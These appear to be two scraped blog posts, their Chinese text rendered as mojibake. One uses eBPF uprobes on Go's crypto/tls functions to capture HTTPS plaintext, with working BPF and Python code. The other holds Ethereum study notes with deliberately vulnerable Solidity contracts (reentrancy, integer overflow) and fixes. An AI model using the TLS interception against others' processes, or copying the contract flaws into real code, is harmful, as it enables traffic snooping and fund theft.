é¦–å…ˆç¼–å†™ç¼–è¯‘ç®€å•çš„goç¨‹åºå¯ä»¥è®¿é—®httpsç½‘ç«™\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 package main import ( \u0026#34;fmt\u0026#34; \u0026#34;io/ioutil\u0026#34; \u0026#34;net/http\u0026#34; \u0026#34;os\u0026#34; ) func main() { client := \u0026amp;http.Client{} // url := \u0026#34;https://www.baidu.com\u0026#34; reqest, err := http.NewRequest(\u0026#34;GET\u0026#34;, os.Args[1], nil) reqest.Header.Set(\u0026#34;Accept-Encoding\u0026#34;, \u0026#34;\u0026#34;) // reqest.Header.Set(\u0026#34;Accept-Encoding\u0026#34;, \u0026#34;gzip, deflate, br\u0026#34;) if err != nil { panic(err) } response, err := client.Do(reqest) if err != nil { panic(err) } defer response.Body.Close() data, err := ioutil.ReadAll(response.Body) if err != nil { panic(err) } fmt.Println(string(data)) } æŠ“å–æµé‡http headeråŠhttp bodyå‡ä¸å¯è§\ntrace.c \u0026amp;\u0026amp; trace.pyâ€”â€”æ¢é’ˆä»£ç åŠæ³¨å…¥ä»£ç  æ³¨å…¥æ–¹å¼ pyç¨‹åºçš„ä½œç”¨æ˜¯é€šè¿‡ç¬¦å·æˆ–è€…åœ°å€æ³¨å…¥uprobe,ä¸»è¦å‡½æ•°æ˜¯ä¸¤ä¸ª å…¶ä¸­nameæ˜¯ç¼–è¯‘å¥½çš„ç”¨æˆ·ç¨‹åº symæ˜¯ç¬¦å· fn_nameæ˜¯è¦ç”¨ä½œå¤„ç†æ¥æ”¶åˆ°æ•°æ®çš„pythonå›è°ƒå‡½æ•°\n1 2 b.attach_uprobe(name=\u0026#34;../target\u0026#34;, sym=\u0026#34;crypto/tls.(*Conn).writeRecordLocked\u0026#34;, fn_name=\u0026#34;crack_https\u0026#34;) b.attach_uretprobe(name=\u0026#34;../target\u0026#34;, sym=\u0026#34;crypto/tls.(*halfConn).decrypt\u0026#34;, fn_name=\u0026#34;crack_response\u0026#34;) å…¶ä¸­goçš„ç¬¦å·æ¯”è¾ƒç‰¹æ®Šï¼Œå¯ä»¥åœ¨è·Ÿè¿›ä»£ç æ‰¾åˆ°å‡½æ•°åé€šè¿‡nmå’Œgrepè·å–ï¼Œä¹Ÿå¯ä»¥é€šè¿‡idaæ¥è·å– å…¶ä¸­nmæ›´å¥½ç”¨\n1 2 3 âœ uprobe nm target | grep writeRecordLocked 000000000058c960 T crypto/tls.(*Conn).writeRecordLocked 000000000058d040 T crypto/tls.(*Conn).writeRecordLocked.func1 å½“ç„¶ä¹Ÿå¯ä»¥æ‰‹åŠ¨ç¼–å†™ï¼Œæœ€å‰é¢è‡ªç„¶æ˜¯goçš„åŒ…åï¼Œç”¨/è¿æ¥ï¼›æ¥ç€æ˜¯å‡½æ•°åï¼Œåœ¨goç¼–ç¨‹ä¸­é€šè¿‡ä½¿ç”¨ç»“æ„ä½“ä¿å­˜æ•°æ®å¹¶ç¼–å†™ç»“æ„ä½“çš„å‡½æ•°æ¥å¤„ç†ï¼Œæ‰€ä»¥ä¹Ÿå°±æ˜¯æŒ‡æ˜ç»“æ„ä½“çš„å‡½æ•°å\nåªèƒ½é€šè¿‡symå’Œaddrå®ç°æ³¨å…¥ åœ¨æ¸…é™¤ç¬¦å·è¡¨çš„æƒ…å†µä¸‹å°±ä¸èƒ½å¾ˆå¥½åœ°èƒœä»»äº†\næ•°æ®è·å– æ¥ç€ä¾¿æ˜¯æœ€é‡è¦çš„ç¼–å†™bpfè·å–æ•°æ®\næœ€é‡è¦çš„æ˜¯çŸ¥é“æ•°æ®åœ¨å“ªé‡Œ\nçœ‹åˆ°çš„ç¬¬ä¸€ä¸ªå‚è€ƒèµ„æ–™é‡Œå°±æ˜¯è·Ÿè¸ªgo tlsï¼Œä½†æ˜¯ä»–çš„å†™æ³•æ˜¯goä¼ å…¥çš„å‚æ•°åœ¨æ ˆä¸Šï¼Œè¿™æ˜¾ç„¶ä¸æ­£ç¡®ï¼Œè€Œä¸”ä»–è¿”å›æ•°æ®çš„ç¼–å†™æ–¹æ³•ä¹Ÿä¸å¤ªæ­£ç¡®ï¼ˆç–¯ç‹‚é­å°¸ï¼‰\nç»è¿‡goç¨‹åºé€†å‘åˆ†ææ€»ç»“å¦‚ä¸‹(å…¶å®ä¹Ÿå°±æ˜¯å¸¸è§„çš„ä¼ å‚æ–¹å¼)\nçŸ­çš„æ•°æ®å¦‚intç›´æ¥é€šè¿‡ä¸€ä¸ªå¯„å­˜å™¨ä¼ è¾“ []byte æ•°ç»„æ˜¯å…¶å®æ˜¯ä¸€ä¸ªæ•°æ®ç»“æ„ åŒ…å«ä¸€ä¸ªæŒ‡é’ˆä¸€ä¸ªé•¿åº¦å€¼å’Œä¸€ä¸ªå®¹é‡å€¼ é€šè¿‡ä¸‰ä¸ªå¯„å­˜å™¨ä¼ è¾“ (çœ‹è¿‡goæºç çš„åº”è¯¥éƒ½çŸ¥é“ è€Œä¸”å®¹é‡å¯ä»¥åŠ¨æ€æ‰©å®¹) 1 2 3 4 5 type slice struct { array unsafe.Pointer len int cap int } æˆ‘ä»¬è¦è·å–ç›¸å…³æ•°æ®çš„å‡½æ•°åŸå‹å¦‚ä¸‹(éƒ½åœ¨crypto/tls/conn.goæ–‡ä»¶ä¸­)\nå…¶ä¸­writeRecordLockedæ˜¯å‘é€æ–¹æ˜æ–‡å…¥å£dataæ˜¯æˆ‘ä»¬çš„æ˜æ–‡æ•°æ®ï¼Œæˆ‘ä»¬éœ€è¦æ ¹æ®recordTypeä¸‹æ¡ä»¶æ–­ç‚¹è·å–dataä¸­çš„æ•°æ®\ndecryptåœ¨readRecordOrCCSä¸­è°ƒç”¨ æ‰€ä»¥æˆ‘ä»¬éœ€è¦åœ¨decryptå‡½æ•°å‡ºå£(é€†å‘æ—¶åœ¨readRecordOrCCSä¸­decryptçš„ä¸‹ä¸€æ¡å‘½ä»¤ä¸‹æ¡ä»¶æ–­å®š)æ³¨å…¥ ä¹Ÿæ ¹æ®recordTypeä¸‹æ¡ä»¶æ–­ç‚¹è·å–è§£å¯†åæ•°æ®\n1 2 3 func (c *Conn) writeRecordLocked(typ recordType, data []byte) (int, error) func (c *Conn) readRecordOrCCS(expectChangeCipherSpec bool) error func (hc *halfConn) decrypt(record []byte) ([]byte, recordType, error) é€†å‘åˆ†æ é˜…è¯»Go crypto/tls æºç å‘ç°å…¶æœ‰å¤šç§æ•°æ®äº¤æ¢ç±»å‹ç±»å‹æ ‡å¿—(æ¯•ç«Ÿtlsè¦ç»è¿‡æ¡æ‰‹å¯†é’¥äº¤æ¢å’Œæ•°æ®åŠ å¯†å¤šä¸ªæ­¥éª¤)\n1 2 3 4 5 6 7 8 9 // TLS record types. type recordType uint8 const ( recordTypeChangeCipherSpec recordType = 20 recordTypeAlert recordType = 21 recordTypeHandshake recordType = 22 recordTypeApplicationData recordType = 23 ) æˆ‘ä»¬è¦è·å–çš„æ˜¯ recordTypeApplicationData\nç”±äºå¼€å‘ç¯å¢ƒlinux ä¸»æœºwindows\nå¯åŠ¨ida serverï¼Œf2åœ¨ writeRecordLocked å¤„ä¸‹æ¡ä»¶æ–­ç‚¹\nå†æ¬¡æ–­ä¸‹åè§‚å¯Ÿå‘ç°å‚æ•°byteæ•°ç»„é€šè¿‡RCX RDX RSIä¸‰ä¸ªå¯„å­˜å™¨ä¼ è¾“ï¼Œå…¶ä¸­RCXä¼ è¾“æŒ‡é’ˆ RDX ä¼ è¾“é•¿åº¦ RSIä¼ è¾“å®¹é‡(å¯ä»¥å¿½ç•¥)\næˆ‘ä»¬ç¼–å†™bpfç¨‹åºå¦‚ä¸‹è·å–å…¶ä¸­æ•°æ®\n1 2 3 4 5 6 7 8 9 10 inline int crack_https(struct pt_regs *ctx) { ... u64* addr = 0; u64 size = 0; // cxå¯„å­˜å™¨æ”¾åœ°å€ dxå¯„å­˜å™¨æ”¾å¤§å° addr = (u64*)ctx-\u0026gt;cx; size = ctx-\u0026gt;dx; ... return 0; } ä¸Šé¢æ˜¯è·å–æˆ‘ä»¬å‘é€çš„ä¿¡æ¯ï¼Œä¹Ÿå°±æ˜¯è¯·æ±‚å¤´å’Œè¯·æ±‚ä½“ï¼Œæ¥ä¸‹å»æˆ‘ä»¬è¦åˆ†æå“åº”å¤´å’Œå“åº”ä½“åœ¨å“ªé‡Œ\nä»æœ€é¡¶ç«¯Requestå¯¹è±¡åˆ‡å…¥ï¼Œæ•°æ®éƒ½åœ¨response.Bodyä¸­ï¼Œè¿™æ˜¯ä¸€ä¸ªioReaderï¼Œæ˜¾ç„¶æˆ‘ä»¬å¯ä»¥ä»è¿™é‡Œè·å–æ•°æ®ï¼Œæˆ‘ä»¬å°½é‡å¾€æ›´åº•å±‚æ‰¾ã€‚\næŸ¥çœ‹conn.goçš„å¤§çº²ï¼Œä¹‹å‰æ•°æ®æ˜¯åœ¨writeç›¸å…³å‡½æ•°ä¸­ï¼Œæˆ‘ä»¬é€šè¿‡read-\u0026gt;readRecordæ‰¾åˆ°äº†readRecordOrCCSï¼Œå…¶ä¸­switchäº†æˆ‘ä»¬ä¸Šé¢è¯´åˆ°çš„recordTypeï¼Œæ‰€ä»¥è¿™å°±æ˜¯æˆ‘ä»¬è¦æ‰¾åˆ°çš„åœ°æ–¹ï¼Œcase recordTypeApplicationDataæ—¶c.input.Reset(data)ï¼Œå†å¯»æ‰¾dataæ‰¾åˆ°äº†decryptå‡½æ•°\ndecryptå‡½æ•°xå¯»æ‰¾äº¤å‰å¼•ç”¨æ‰¾å…¶åœ¨readRecordOrCCSä¸­çš„ä½ç½®ï¼Œç”±äºreadRecordOrCCSå‡½æ•°å¤æ‚ï¼Œåœ¨å¯»æ‰¾recordTypeæ—¶èŠ±è´¹äº†äº›è®¸åŠŸå¤«ï¼Œæœ€åå‘ç°rdiå¯„å­˜å™¨æ”¾ç½®æ­¤æ—¶ä»£ç ä¸­çš„typå˜é‡ä¹Ÿå°±æ˜¯recordTypeï¼Œä¸‹æ¡ä»¶æ–­ç‚¹å¦‚ä¸‹\nf9å†æ¬¡è¿è¡Œåˆ°æ–­ç‚¹å¤„ é€ä¸€æŸ¥çœ‹å¯„å­˜å™¨ä¸­ä¿å­˜çš„åœ°å€æœ€ç»ˆåœ¨RAXä¸­å‘ç°äº†http header\nä½†æ˜¯ç”±äºåªçœ‹åˆ°æ˜æ–‡çš„header æ‰€ä»¥ç»è¿‡å¤šæ¬¡è°ƒè¯•å°è¯•è¿è¡Œbodyæ— æœå·®ç‚¹è‡ªé—­ï¼Œæœ€åè§‚å¯Ÿheaderå‘ç°æ—¶gzipå‹ç¼©çš„body(æˆ‘åƒæ˜¯ä¸ªå‚»é€¼) ida dç¡®å®šæ•°æ®ç±»å‹å³é”®convert to arrayæŒ‡å®šå¤§å°å¯¼å‡º æ•°æ®ç”¨010ä¿å­˜æˆæ–‡ä»¶åˆ æ‰æ˜æ–‡headerç›´æ¥ç”¨å‹ç¼©è½¯ä»¶æ‰“å¼€å°±æ˜¯ç½‘é¡µçš„æ–‡æœ¬\nå†æ¬¡è§‚å¯ŸRBXä¸­é˜²æ­¢çš„å°±æ˜¯æ•°æ®çš„é•¿åº¦ RCXå°±æ˜¯sliceçš„å®¹é‡\nç¼–å†™ä»£ç å¦‚ä¸‹è·å–æ•°æ®\n1 2 3 4 5 6 7 8 9 inline int crack_response(struct pt_regs *ctx) { u64* addr = 0; u32 size = 0; ... addr = (u64*)ctx-\u0026gt;ax; size = ctx-\u0026gt;bx; ... return 0; } æœ€ç»ˆä»£ç  bpfä»£ç çš„ç¼–è¯‘æ£€æµ‹ååˆ†ä¸¥æ ¼ï¼Œè¿™é‡Œè¿˜æœ‰å‡ ä¸ªæ³¨æ„ç‚¹\nç»è¿‡è°ƒè¯•å‘ç°goå¤„ç†å¤§æ•°æ®çš„æ—¶å€™æ¯æ¬¡æœ€å¤šè§£å¯†0x4000çš„æ•°æ® æ‰€ä»¥MAX_LENè®¾ç½®æˆäº†0x4000ï¼Œç»è¿‡æµ‹è¯•ä¹Ÿæ˜¯æ­£ç¡®çš„æ²¡æœ‰æ•°æ®ä¸¢å¤±\nBPF_PERF_OUTPUTçš„æ­£ç¡®ç”¨æ³•åº”è¯¥æ˜¯ç”¨æ¥è§¦å‘äº‹ä»¶è€Œä¸æ˜¯å‘é€æ•°æ®çš„ï¼ŒçœŸæ­£ä¼ è¾“æ•°æ®è¿˜æ˜¯è¦é BPF_PERCPU_ARRAYåŒ…ç»“æ„ä½“\nperf_submitè¿”å›æ•°æ®æŒ‡å®šå¤§å°åº”è¯¥æ˜¯dataçš„å¤§å°åŠ ä¸Šä¸€ä¸ªsizeof(u32) ä¹Ÿå°±æ˜¯ç»“æ„ä½“ä¸­lençš„å¤§å°å¦åˆ™æœ€åä¼šä¸¢å¤±å››å­—èŠ‚\npython open_perf_bufferé€šè¿‡æŒ‡å®špage_cntæ¥å¼€ä¸€ä¸ªå¤§çš„ring bufferä»¥ç¡®ä¿èƒ½å¤ŸåŠæ—¶è¾“å‡ºå¦åˆ™ä¼šä¸¢å¤±æ•°æ®\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 #include \u0026lt;uapi/linux/ptrace.h\u0026gt; #define MAX_LEN 0x4000 struct send_data_t { u32 len; u8 data[MAX_LEN]; }; struct recv_data_t { u32 len; u8 data[MAX_LEN]; }; BPF_PERF_OUTPUT(write_events); BPF_PERCPU_ARRAY(write_data, struct send_data_t, 1); BPF_PERF_OUTPUT(read_events); BPF_PERCPU_ARRAY(read_data, struct recv_data_t, 1); inline int crack_https(struct pt_regs *ctx) { u32 zero = 0; u64* addr; u64 size = 0; struct send_data_t *data = write_data.lookup(\u0026amp;zero); if (!data) return 0; // crypto/tls/common.go/const recordTypeApplicationData uint8 = 23 if (ctx-\u0026gt;bx != 23) return 0; // cxå¯„å­˜å™¨æ”¾åœ°å€ dxå¯„å­˜å™¨æ”¾å¤§å° addr = (u64*)ctx-\u0026gt;cx; size = ctx-\u0026gt;dx; if(size \u0026gt; MAX_LEN) return 0; data-\u0026gt;len = size; bpf_probe_read(data-\u0026gt;data, size, addr); write_events.perf_submit(ctx, data, size+sizeof(u32)); return 0; } inline int crack_response(struct pt_regs *ctx) { u32 zero = 0; u64* addr; u32 size = 0; struct recv_data_t *data = read_data.lookup(\u0026amp;zero); if (!data) return 0; if (ctx-\u0026gt;di != 23) return 0; addr = (u64*)ctx-\u0026gt;ax; size = ctx-\u0026gt;bx; if(size \u0026gt; MAX_LEN) return 0; data-\u0026gt;len = size; bpf_probe_read(data-\u0026gt;data, size, addr); read_events.perf_submit(ctx, data, size+sizeof(u32)); return 0; } 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 from bcc import BPF import ctypes as ct def write_printer(cpu, data, size): print(\u0026#34;write:\u0026#34;,size) snd_data = b[\u0026#34;write_events\u0026#34;].event(data) event = ct.cast(snd_data.data, ct.POINTER(ct.c_char * snd_data.len)).contents print(bytes(event)) def read_printer(cpu, data, size): print(\u0026#34;read:\u0026#34;,size) rcv_data = b[\u0026#34;read_events\u0026#34;].event(data) event = ct.cast(rcv_data.data, ct.POINTER(ct.c_char * rcv_data.len)).contents print(bytes(event)) if __name__ == \u0026#34;__main__\u0026#34;: perf_ring_buffer_page_cnt = 256 # load BPF program b = BPF(text=open(\u0026#34;./trace.c\u0026#34;).read()) # https://github.com/iovisor/bcc/blob/master/docs/reference_guide.md#4-attach_uprobe b.attach_uprobe(name=\u0026#34;../uprobe\u0026#34;, sym=\u0026#34;crypto/tls.(*Conn).writeRecordLocked\u0026#34;, fn_name=\u0026#34;crack_https\u0026#34;) b.attach_uretprobe(name=\u0026#34;../uprobe\u0026#34;, sym=\u0026#34;crypto/tls.(*halfConn).decrypt\u0026#34;, fn_name=\u0026#34;crack_response\u0026#34;) # https://github.com/toru/h2olog/pull/28 # page_cnt to improve performance to avoid \u0026#34;Possibly lost %d samples\u0026#34; b[\u0026#34;write_events\u0026#34;].open_perf_buffer(write_printer, page_cnt=perf_ring_buffer_page_cnt) b[\u0026#34;read_events\u0026#34;].open_perf_buffer(read_printer, page_cnt=perf_ring_buffer_page_cnt) while 1: try: b.perf_buffer_poll() except KeyboardInterrupt: exit() ================================================================\nåç»­ï¼šäº†è§£åˆ°Goåœ¨1.17ä¹‹å‰å…¶å®æ˜¯ç”¨æ ˆä¼ å‚æ•°çš„ 1.17ä¹‹åæ‰æ˜¯ç”¨å¯„å­˜å™¨ä¼ å‚æ•°\nçœ‹äº†ã€ŠBPF Performance Toolsã€‹è¿™æœ¬ä¹¦ å­¦äº†ç‚¹bpftrace ç”¨bpftraceå†™èµ·æ¥ååˆ†æ–¹ä¾¿\nè¿™æ˜¯Go1.17ä¹‹åçš„å†™æ³• 1.17 1.18éƒ½ç¼–è¯‘è¯•è¿‡å¯„å­˜å™¨æ²¡å˜éƒ½èƒ½ç”¨\nä½†æ˜¯responseå¹¶ä¸èƒ½%sè¾“å‡º å› ä¸ºä¼šæœ‰\\0æˆªæ–­ bpftraceé‡Œé¢æ²¡æœ‰forä¸èƒ½%c æ²¡æœ‰sys_write ä¸çŸ¥é“å…·ä½“è¦æ€ä¹ˆè¾“å‡ºäº† åªå®Œæˆäº†requestéƒ¨åˆ†\n1 2 3 4 5 6 7 8 9 10 11 12 13 #!/usr/local/bin/bpftrace uprobe:$1:\u0026#34;crypto/tls.(*Conn).writeRecordLocked\u0026#34; / reg(\u0026#34;bx\u0026#34;) == 23 / { printf(\u0026#34;Request:\\n%s\\n\u0026#34; , str(reg(\u0026#34;cx\u0026#34;), reg(\u0026#34;dx\u0026#34;)) ); } uretprobe:$1:\u0026#34;crypto/tls.(*halfConn).decrypt\u0026#34; / reg(\u0026#34;di\u0026#34;) == 23 / { // printf(\u0026#34;Response:\\n%s\u0026#34; , str(reg(\u0026#34;ax\u0026#34;), reg(\u0026#34;bx\u0026#34;)) ); } ä½†æ˜¯ä¹¦ä¸­æ²¡æœ‰å†™åˆ°sargçš„ç”¨æ³• bpftraceä¸“é—¨å¯¹ç”¨æ ˆä¼ å€¼çš„ç¨‹åºçš„å†…ç½®å‚æ•° ç”¨ä½œGo1.17ä¹‹å‰çš„ç¨‹åºååˆ†æ–¹ä¾¿\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 #!/usr/local/bin/bpftrace uprobe:$1:\u0026#34;crypto/tls.(*Conn).writeRecordLocked\u0026#34; / sarg1 == 23 / { // 74624 23 1134592 113 4096 // printf(\u0026#34;%d %d %d %d %d\\n\u0026#34; , sarg0,sarg1,sarg2,sarg3,sarg4); // type slice struct { // array unsafe.Pointer // len int // cap int // } printf(\u0026#34;Request:\\n%s\\n\u0026#34; , str(sarg2, sarg4) ); } Refer https://cloud.tencent.com/developer/article/1793586 https://blog.csdn.net/Rong_Toa/article/details/119957060 https://arthurchiao.art/blog/trace-packet-with-tracepoint-perf-ebpf-zh/#31-ebpf-%E5%92%8C-kprobes https://github.com/iovisor/bcc/blob/master/docs/reference_guide.md#3-bpf_array https://kubesphere.io/zh/blogs/ebpf-tracing-user-processes/#1-%E5%89%8D%E8%A8%80 https://github.com/toru/h2olog/pull/28 ","description":"","id":15,"section":"posts","tags":["network","bpf"],"title":"eBPF Uprobe bypass Go tlsâ€”â€”æŠ“å–httpsæ˜æ–‡æµé‡","uri":"https://ruokeqx.gitee.io/posts/bpf_uprobe_bypass_go_tls/"},{"content":"Background æœºç¼˜å·§åˆï¼Œ5-18é¢äº†æŸè“å‚web3\u0026amp;åŒºå—é“¾éƒ¨é—¨ï¼Œé‚æƒ³äº†è§£ä¸€ä¸‹web3\u0026amp;åŒºå—é“¾ã€‚\nçœ‹äº†ä¸€äº›è§†é¢‘ï¼Œäº†è§£äº†Web3ã€DAppã€DeFiã€GameFiç­‰æ¦‚å¿µã€‚\nä¸¤ä¸‰å¤©æ—¶é—´è‚å®Œäº†ã€ŠMastering Ethereum: Building Smart Contracts and DAppsã€‹ã€‚\näº†è§£äº†ä»¥å¤ªåŠè®¾è®¡ç†å¿µï¼Œé’±åŒ…ã€äº¤æ˜“ã€ä»£å¸ã€é¢„è¨€æœºï¼Œå®‰å…¨ç­–ç•¥ï¼Œå®‰å…¨æ¼æ´æ”»å‡»æ–¹å¼åŠä¿®å¤æ–¹å¼ï¼›å¯¹æœ€æ–°ç‰ˆæœ¬ç¼–è¯‘å™¨ç”Ÿæˆçš„EVMå­—èŠ‚ç è¿›è¡Œåˆ†æï¼›å‘ç°å¹¶é€’äº¤äº†ä¹¦ä¸­å‡ºç°çš„å¤šä¸ªé”™è¯¯ã€‚\nå¯ä»¥è¯´æ˜¯æ”¶è·é¢‡ä¸°ï¼Œå†™ç¯‡åšå®¢åšä¸‹ç¬”è®°å’Œå›é¡¾ã€‚\nä¸€ã€What is Ethereum Bitcoin: peer to peer cash system\nEthereum: Smart contracts and DApps infrastructure\nturing complete\ngas beat DOS\näºŒã€Basic concept å•ä½\r10**18 wei == 10**9 shannon(gigawei) == 1 ether metamask ropsten faucet\nä¸‰ã€å®¢æˆ·ç«¯ geth(go)\nparity(rust)\njson-rpc port 8545\nå››ã€å¯†ç å­¦ ç®€å•ECC\u0026amp;ECDSA\nä»¥å¤ªåŠåœ°å€ï¼š\nK(pub) = k(pri)*G\naddr = Keccak256(K)[-20:]\näº”ã€é’±åŒ… é’±åŒ…ç§å­ åŠ©è®°è¯\nå…­ã€äº¤æ˜“ nonce\ngas price\ngas limit\nrecipient\nvalue\ndata\nv,r,s\né€’å½’é•¿åº¦å‰ç¼€(RLP)ç¼–ç \nåˆçº¦è´¦æˆ· å¤–éƒ¨è´¦æˆ·\nåˆçº¦åˆ›å»ºåœ°å€0x0\nä¸ƒã€Solidity 1 2 3 # binary code solc --optimize --bin Faucet.sol solc --abi Faucet.sol 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 // SPDX-License-Identifier: CC-BY-SA-4.0 pragma solidity 0.8.14; // base contract contract Owned { address payable owner; constructor (){ owner = payable(msg.sender); } // function decorator modifier onlyOwner { // tx.origin unsafe require(msg.sender == owner); _; } } // child contract contract Mortal is Owned { // Contract destructor function destroy() public onlyOwner { selfdestruct(owner); } } contract Faucet is Mortal { // function FunctionName([parameters]) {public|private|internal|external} // [pure|view|payable] [modifiers] [returns (return types)] event Withdrawal(address indexed to, uint amount); event Deposit(address indexed from, uint amount); // Accept any incoming amount receive() external payable { emit Deposit(msg.sender, msg.value); } // Give out ether to anyone who asks function withdraw(uint withdraw_amount) public { // Limit withdrawal amount require(withdraw_amount \u0026lt;= 100000000000000000); require(withdraw_amount \u0026lt;= 0.1 ether); require( address(this).balance \u0026gt;= withdraw_amount, \u0026#34;Insufficient balance in faucet for withdrawal request\u0026#34; ); // Send the amount to the address that requested it payable(msg.sender).transfer(withdraw_amount); emit Withdrawal(msg.sender, withdraw_amount); // Some context // msg // tx // block // address } } å…«ã€Vyper å†…å®¹æ¯”è¾ƒå°‘ è®¤ä¸ºä¹Ÿä¸æ˜¯ä¸»è¦ç¼–å†™åˆçº¦ä»£ç ï¼Œçœ‹ä¸€ä¸ªsolidityå¤Ÿäº† å°±æ²¡çœ‹\nä¹ã€æ™ºèƒ½åˆçº¦å®‰å…¨ é‡å…¥æ”»å‡» æ¼æ´ç‚¹ï¼š\nline16 æ”»å‡»æ–¹ä½¿ç”¨å›è°ƒå‡½æ•°ä¸æ–­è¯·æ±‚ ç„¶åç»´æŒçš„balancesåˆ—è¡¨æ•°æ®æ²¡æœ‰ä¿®æ”¹ä¸€ç›´æ»¡è¶³æ¡ä»¶\nä¿®å¤ï¼š\n1.å†…ç½®transferå‡½æ•°(å†…éƒ¨é™åˆ¶äº†2300gas) 2.æ£€æŸ¥-ç”Ÿæ•ˆ-äº¤äº’(æŠŠbalancesçš„ä¿®æ”¹æ”¾åˆ°è°ƒç”¨ä¹‹å‰)\n3.solä»£ç ä¸­ä½¿ç”¨äº’æ–¥é”\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 contract EtherStore { uint256 public withdrawalLimit = 1 ether; mapping(address =\u0026gt; uint256) public lastWithdrawTime; mapping(address =\u0026gt; uint256) public balances; function depositFunds() external payable { balances[msg.sender] += msg.value; } function withdrawFunds(uint256 _weiToWithdraw) public { require(balances[msg.sender] \u0026gt;= _weiToWithdraw); // limit the withdrawal require(_weiToWithdraw \u0026lt;= withdrawalLimit); // limit the time allowed to withdraw require(block.timestamp \u0026gt;= lastWithdrawTime[msg.sender] + 1 weeks); msg.sender.call{value: _weiToWithdraw}(\u0026#34;\u0026#34;); balances[msg.sender] -= _weiToWithdraw; lastWithdrawTime[msg.sender] = block.timestamp; } } æ•´å‹æº¢å‡º æ¼æ´ç‚¹ï¼š\nline11 æ•´å‹ä¸Šæº¢ increaseLockTime(2**256-userLockTime) ä¸Šæº¢ä¸º0 å°±å¯ä»¥å–å‡ºetheräº†\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 contract TimeLock { mapping(address =\u0026gt; uint256) public balances; mapping(address =\u0026gt; uint256) public lockTime; function deposit() external payable { balances[msg.sender] += msg.value; lockTime[msg.sender] = block.timestamp + 1 weeks; } function increaseLockTime(uint256 _secondsToIncrease) public { lockTime[msg.sender] += _secondsToIncrease; } function withdraw() public { require(balances[msg.sender] \u0026gt; 0); require(block.timestamp \u0026gt; lockTime[msg.sender]); uint256 transferValue = balances[msg.sender]; balances[msg.sender] = 0; payable(msg.sender).transfer(transferValue); } } æ¼æ´ç‚¹ï¼š\nline14 15 æ•´å‹ä¸‹æº¢ 0å‡å»ä»»ä½•æ­£æ•´æ•°éƒ½å¤§äº0\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 // SPDX-License-Identifier: MIT pragma solidity ^0.6.0; contract Token { mapping(address =\u0026gt; uint) balances; uint public totalSupply; constructor(uint _initialSupply) public { balances[msg.sender] = totalSupply = _initialSupply; } function transfer(address _to, uint _value) public returns (bool) { require(balances[msg.sender] - _value \u0026gt;= 0); balances[msg.sender] -= _value; balances[_to] += _value; return true; } function balanceOf(address _owner) public view returns (uint balance) { return balances[_owner]; } } ä¿®å¤ï¼š\né€šå¸¸ä½¿ç”¨æˆ–æ„å»ºå®‰å…¨ç®—æœ¯è¿ç®—çš„åº“åˆçº¦æ¥æ›¿ä»£æ ‡å‡†çš„ç®—æœ¯åŠ å‡\nUnexpected Ether selfdestructæŒ‡ä»¤å¯ä»¥å°†åˆçº¦æ‘§æ¯å¹¶å°†ä½™é¢ä¼ å…¥æŒ‡å®šåœ°å€ é¢„å…ˆå‘é€ether åˆçº¦åœ°å€é€šè¿‡ address = sha3(rlp.encode([account_address,transaction_nonce])) è®¡ç®— äº‹å…ˆä¼ å…¥ether æ¼æ´ç‚¹ï¼š\nline 14 æœªé¢„æœŸçš„ether ä¼ å…¥éæ•´æ•°å æ°¸è¿œä¸å¯èƒ½ç­‰äº10\nä¿®å¤ï¼š\næ¼æ´æ¥æºäºå¯¹this.balanceçš„ä¾èµ–ï¼Œå®Œå…¨å¯ä»¥æ–°å¢ä¸€ä¸ªå˜é‡è¿½è¸ªå……å€¼æ•°é¢ï¼Œè¿™æ ·å°±å¯ä»¥é¿å…æ”»å‡»\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 contract EtherGame { uint256 public payoutMileStone1 = 3 ether; uint256 public mileStone1Reward = 2 ether; uint256 public payoutMileStone2 = 5 ether; uint256 public mileStone2Reward = 3 ether; uint256 public finalMileStone = 10 ether; uint256 public finalReward = 5 ether; mapping(address =\u0026gt; uint256) redeemableEther; // Users pay 0.5 ether. At specific milestones, credit their accounts. function play() external payable { require(msg.value == 0.5 ether); // each play is 0.5 ether uint256 currentBalance = address(this).balance + msg.value; // ensure no players after the game has finished require(currentBalance \u0026lt;= finalMileStone); // if at a milestone, credit the player\u0026#39;s account if (currentBalance == payoutMileStone1) { redeemableEther[msg.sender] += mileStone1Reward; } else if (currentBalance == payoutMileStone2) { redeemableEther[msg.sender] += mileStone2Reward; } else if (currentBalance == finalMileStone) { redeemableEther[msg.sender] += finalReward; } return; } function claimReward() public { // ensure the game is complete require(address(this).balance == finalMileStone); // ensure there is a reward to give require(redeemableEther[msg.sender] \u0026gt; 0); uint256 transferValue = redeemableEther[msg.sender]; redeemableEther[msg.sender] = 0; payable(msg.sender).transfer(transferValue); } } åã€ä»£å¸ ERC20ã€ERC721(NFT)\nåä¸€ã€é¢„è¨€æœº é¢„è¨€æœºæ˜¯ä¸€ä¸ªå¯ä»¥å›ç­”ä»¥å¤ªåŠå¤–éƒ¨é—®é¢˜çš„ç³»ç»Ÿã€‚\nè®¾ç½®é¢„è¨€æœºçš„ä¸‰ç§ä¸»è¦æ–¹å¼å¯ä»¥åˆ†ä¸º 